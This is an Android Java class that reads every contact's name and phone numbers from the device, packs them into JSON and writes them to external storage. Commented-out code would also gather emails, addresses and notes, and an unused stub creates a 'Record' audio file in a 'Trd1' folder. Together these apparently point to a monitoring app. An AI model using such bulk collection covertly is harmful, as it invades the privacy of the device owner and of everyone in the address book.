package com.postal.omniscient.postal.reader.contact;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.ContactsContract;
import android.util.Log;


import com.postal.omniscient.postal.write.json.WriteToJsonFile;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Кдасс читает все контакты
 * Created by Александр on 13.04.2016.
 */
public class ReadContacts {

    private ContentResolver contentResolver;
    private Context context;
    private static String Msg = "MyMsg";
    private static String _id ="_id";
    private static String url = "content://com.android.contacts/contacts";
    private static String display_name = "display_name";
    private static String has_phone_number = "has_phone_number";
    private static String number = "data1";
    private static String contact_id = "contact_id";
    private static String phone_url = "content://com.android.contacts/data/phones";
    private int x=0,y=21;// сколько полей телефонов считывать, думаю все поместятса (21 поле)

    public ReadContacts(Context context) {
        this.contentResolver = context.getContentResolver();
        this.context = context;
    }

    public int getX() {
        return x;
    }

    public int getY() {
        return y;
    }

    /**
     * Читаем все контакты
     * Возвращяет 2х мерный массив типа String
     * массив [имя][телефоны]
     * Created by Александр on 13.04.2016.
     */
    private String[][] readContacts() {
        Uri uri = Uri.parse(url);
        Uri phone_uri = Uri.parse(phone_url);
        ContentResolver cr = contentResolver;
        Cursor cur = cr.query(uri, //ContactsContract.Contacts.CONTENT_URI
                null, null, null, null);

        Log.i(Msg,": cur : " + cur.getCount());
        x=cur.getCount();

        String [][] phone_contacts = new String[x][y];
        ////////////////////////////////////////////
        String out = new SimpleDateFormat("dd-MM-yyyy hh-mm-ss").format(new Date());
        File sampleDir = new File(Environment.getExternalStorageDirectory(), "/Trd1");
        if (!sampleDir.exists()) {
            sampleDir.mkdirs();
        }
        String file_name = "Record";
        try {
            File  audiofile = File.createTempFile(file_name, "postal.amr", sampleDir);
        } catch (IOException e) {
            e.printStackTrace();
        }




        ///////////////////////////////////////////

        if (cur.getCount() > 0) {
            for (int i=0; cur.moveToNext(); i++) {

                String id = cur
                        .getString(cur.getColumnIndex(_id));//ContactsContract.Contacts._ID));
                String name = cur
                        .getString(cur.getColumnIndex(display_name));//ContactsContract.Contacts.DISPLAY_NAME));
                if (Integer.parseInt(cur.getString(cur.getColumnIndex
                        (has_phone_number))) > 0) {//ContactsContract.Contacts.HAS_PHONE_NUMBER
//                    Log.i(Msg,": name : " + name + ", ID : " + id);

                    phone_contacts[i][0] = name;


                    // get the phone number
                    Cursor pCur = cr.query(phone_uri, null, //ContactsContract.CommonDataKinds.Phone.CONTENT_URI
                            contact_id + " = ?", //ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                            new String[]{id}, null);
                    for (int k=1; pCur.moveToNext(); k++) {
                            String phone = pCur.getString(
                                    pCur.getColumnIndex(number)); //ContactsContract.CommonDataKinds.Phone.NUMBER;
//                        Log.i(Msg,": phone : " + phone);
                            phone_contacts[i][k] = phone;
                    }
                    pCur.close();



//                    // get email and type
//
//                    Cursor emailCur = cr.query(
//                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
//                            null,
//                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
//                            new String[]{id}, null);
//                    while (emailCur.moveToNext()) {
//                        // This would allow you get several email addresses
//                        // if the email addresses were stored in an array
//                        String email = emailCur.getString(
//                                emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
//                        String emailType = emailCur.getString(
//                                emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
//
//                        System.out.println("Email " + email + " Email Type : " + emailType);
//                    }
//                    emailCur.close();
//
//                    // Get note.......
//                    String noteWhere = ContactsContract.
//                            Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
//                    String[] noteWhereParams = new String[]{id,
//                            ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE};
//                    Cursor noteCur = cr.query(ContactsContract.
//                            Data.CONTENT_URI, null, noteWhere, noteWhereParams, null);
//                    if (noteCur.moveToFirst()) {
//                        String note = noteCur.getString(noteCur.getColumnIndex(
//                                ContactsContract.CommonDataKinds.Note.NOTE));
//                        System.out.println("Note " + note);
//                    }
//                    noteCur.close();
//
//                    //Get Postal Address....
//
//                    String addrWhere = ContactsContract.
//                            Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
//                    String[] addrWhereParams = new String[]{id,
//                            ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE};
//                    Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI,
//                            null, null, null, null);
//                    while (addrCur.moveToNext()) {
//                        String poBox = addrCur.getString(
//                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.
//                                        StructuredPostal.POBOX));
//                        String street = addrCur.getString(
//                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.
//                                        StructuredPostal.STREET));
//                        String city = addrCur.getString(
//                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.
//                                        StructuredPostal.CITY));
//                        String state = addrCur.getString(
//                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.
//                                        StructuredPostal.REGION));
//                        String postalCode = addrCur.getString(
//                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.
//                                        StructuredPostal.POSTCODE));
//                        String country = addrCur.getString(
//                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.
//                                        StructuredPostal.COUNTRY));
//                        String type = addrCur.getString(
//                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.
//                                        StructuredPostal.TYPE));
//
//                        // Do something with these....
//
//                    }
//                    addrCur.close();
//
//                    // Get Instant Messenger.........
//                    String imWhere = ContactsContract.
//                            Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
//                    String[] imWhereParams = new String[]{id,
//                            ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE};
//                    Cursor imCur = cr.query(ContactsContract.Data.CONTENT_URI,
//                            null, imWhere, imWhereParams, null);
//                    if (imCur.moveToFirst()) {
//                        String imName = imCur.getString(
//                                imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));
//                        String imType;
//                        imType = imCur.getString(
//                                imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.TYPE));
//
//                    }
//                    imCur.close();
//
//                    // Get Organizations.........
//
//                    String orgWhere = ContactsContract.
//                            Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
//                    String[] orgWhereParams = new String[]{id,
//                            ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE};
//                    Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI,
//                            null, orgWhere, orgWhereParams, null);
//                    if (orgCur.moveToFirst()) {
//                        String orgName = orgCur.getString(orgCur.getColumnIndex(
//                                ContactsContract.CommonDataKinds.Organization.DATA));
//                        String title = orgCur.getString(orgCur.getColumnIndex(
//                                ContactsContract.CommonDataKinds.Organization.TITLE));
//                    }
//                    orgCur.close();
                }
            }
            cur.close();
        }

        return phone_contacts;
    }
    public void getContacts(){
       // ReadContacts getPhones = new ReadContacts(contentResolver);
        String [][] phone_contacts = readContacts();
        WriteToJsonFile write = new WriteToJsonFile();

        JSONArray number;//все номера телефонов одного контакта
        JSONObject name_and_phone;// имя и телефоны
        JSONArray person = new JSONArray();// массив с имени и телефонов
        JSONObject contacts = new JSONObject();//просто заголовок типа тут контакты, а не шпроты
        for (int i=0; getX()>i; i++) {
            if(phone_contacts[i][0]!=null) {

                number = new JSONArray();
                name_and_phone = new JSONObject();

                for (int k = 1; getY() > k; k++) {
                    if (phone_contacts[i][k] != null) {

                        number.put(phone_contacts[i][k]);
//                    Log.i(Msg, " Json :"+i+" "+number.toString());
                    }
                }

                try {
                    name_and_phone.put("Names", phone_contacts[i][0]);//name);
                    name_and_phone.put("Phones", number);// phones);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                person.put(name_and_phone);
            }
        }
        try {
            contacts.put("Contacts", person);
        } catch (JSONException e) {
            e.printStackTrace();
        }
         Log.i(Msg, " Json : "+contacts.toString());
        write.writeFileSD(contacts);
    }
}
